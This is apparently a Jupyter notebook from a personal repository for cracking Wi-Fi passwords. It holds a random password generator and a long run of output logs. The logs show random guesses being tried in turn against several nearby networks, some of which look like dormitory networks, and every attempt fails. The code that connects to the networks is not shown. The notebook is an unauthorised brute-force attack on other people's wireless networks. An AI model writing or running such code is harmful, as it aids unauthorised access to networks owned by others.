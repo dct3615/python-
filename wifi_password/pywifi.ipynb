{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "sys.path.append('D:\\Anaconda3\\Lib\\site-packages')\n",
    "import random\n",
    "import string\n",
    "\n",
    "def generate_random_str(num,start,median,end):\n",
    "    \"\"\"\n",
    "    生成一个指定长度的随机字符串，其中\n",
    "    string.digits=0123456789\n",
    "    string.ascii_letters=abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n",
    "    \"\"\"\n",
    "    start_pwd = [random.choice(string.ascii_letters) for i in range(start)]\n",
    "    end_pwd = [random.choice(string.ascii_letters) for i in range(end)]\n",
    "    median_pwd = [random.choice(string.digits) for i in range(median)]\n",
    "       \n",
    "    if num%2 == 0:\n",
    "        password = start_pwd + median_pwd\n",
    "    else:\n",
    "        password = median_pwd + end_pwd\n",
    "\n",
    "    random_str = ''.join(password)\n",
    "    \n",
    "    return random_str\n",
    "\n",
    "def creat_pwd(num):\n",
    "    start = random.randint(2,3)\n",
    "    median = random.randint(5,8)\n",
    "    end = random.randint(2,3)\n",
    "\n",
    "    pwd = generate_random_str(num,start,median,end)\n",
    "    if len(pwd) < 8:\n",
    "        return False\n",
    "    else:\n",
    "        return pwd\n",
    "    \n",
    "# num = 0\n",
    "# while True:\n",
    "#     pwd = creat_pwd(num)  \n",
    "#     num += 1\n",
    "#     if num == 100:\n",
    "#         break\n",
    "#     if  pwd:\n",
    "#         print ('长度：',len(pwd),\"密码：\",pwd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['BP2197', 'BP2380', 'Xiaomi_4D0F_5G', 'whhh', 'Ruoshui317', '311', '321sushe', '313']\n",
      "num= 1 Fail Current WifiName: BP2197 Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: whhh Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: Ruoshui317 Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: 311 Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: 321sushe Current Password: 1293587PbS\n",
      "num= 1 Fail Current WifiName: 313 Current Password: 1293587PbS\n",
      "num= 2 Fail Current WifiName: BP2197 Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: whhh Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: Ruoshui317 Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: 311 Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: 321sushe Current Password: TRW29737\n",
      "num= 2 Fail Current WifiName: 313 Current Password: TRW29737\n",
      "num= 3 Fail Current WifiName: BP2197 Current Password: 94350875xub\n",
      "num= 3 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 94350875xub\n",
      "num= 3 Fail Current WifiName: whhh Current Password: 94350875xub\n",
      "num= 3 Fail Current WifiName: Ruoshui317 Current Password: 94350875xub\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:22,483 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 3 Fail Current WifiName: 311 Current Password: 94350875xub\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:28,066 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 3 Fail Current WifiName: 321sushe Current Password: 94350875xub\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:33,642 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 3 Fail Current WifiName: 313 Current Password: 94350875xub\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:39,214 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: BP2197 Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:44,793 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:50,360 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: whhh Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:47:55,933 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: Ruoshui317 Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:01,502 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: 311 Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:07,070 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: 321sushe Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:12,649 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 4 Fail Current WifiName: 313 Current Password: toX046367\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:18,216 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: BP2197 Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:23,788 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:29,361 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: whhh Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:34,948 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: Ruoshui317 Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:40,520 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: 311 Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:46,098 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: 321sushe Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:51,670 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 5 Fail Current WifiName: 313 Current Password: 041629cXS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:48:57,244 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: BP2197 Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:02,818 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:08,383 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: whhh Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:13,397 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: Ruoshui317 Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:18,968 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: 311 Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:24,543 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: 321sushe Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:30,114 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 6 Fail Current WifiName: 313 Current Password: xur88700551\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:35,688 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: BP2197 Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:41,263 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:46,839 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: whhh Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:51,858 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: Ruoshui317 Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:49:57,428 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: 311 Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:03,002 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: 321sushe Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:08,579 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 7 Fail Current WifiName: 313 Current Password: 6216410dKp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:14,152 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: BP2197 Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:19,724 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:25,291 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: whhh Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:30,309 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: Ruoshui317 Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:35,890 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: 311 Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:41,465 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: 321sushe Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:47,042 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 8 Fail Current WifiName: 313 Current Password: Cql11624\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:52,614 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: BP2197 Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:50:58,189 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:03,773 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: whhh Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:08,797 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: Ruoshui317 Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:14,363 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: 311 Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:19,939 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: 321sushe Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:25,512 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 9 Fail Current WifiName: 313 Current Password: 24546094dPY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:31,087 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: BP2197 Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:36,659 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:42,236 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: whhh Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:47,256 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: Ruoshui317 Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:52,830 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: 311 Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:51:58,399 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: 321sushe Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:03,966 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 10 Fail Current WifiName: 313 Current Password: QE052606\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:09,539 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: BP2197 Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:15,114 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:20,685 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: whhh Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:25,704 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: Ruoshui317 Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:31,278 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: 311 Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:36,849 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: 321sushe Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:42,423 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 12 Fail Current WifiName: 313 Current Password: mn4293616\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:47,996 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: BP2197 Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:53,567 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:52:59,139 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: whhh Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:04,158 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: Ruoshui317 Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:09,731 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: 311 Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:15,304 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: 321sushe Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:20,880 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 13 Fail Current WifiName: 313 Current Password: 451175XkB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:26,455 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: BP2197 Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:32,021 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:37,588 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: whhh Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:42,608 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: Ruoshui317 Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:48,180 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: 311 Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:53,743 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: 321sushe Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:53:59,318 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 14 Fail Current WifiName: 313 Current Password: Bbx65420840\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:04,894 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: BP2197 Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:10,466 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:16,038 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: whhh Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:21,059 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: Ruoshui317 Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:26,641 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: 311 Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:32,214 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: 321sushe Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:37,782 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 15 Fail Current WifiName: 313 Current Password: 12485234UIm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:43,354 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: BP2197 Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:48,930 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:54,505 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: whhh Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:54:59,526 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: Ruoshui317 Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:05,100 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: 311 Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:10,677 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: 321sushe Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:16,252 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 16 Fail Current WifiName: 313 Current Password: AzB80342151\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:21,844 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: BP2197 Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:27,418 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 17 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 84430994uZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-02 23:55:32,989 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
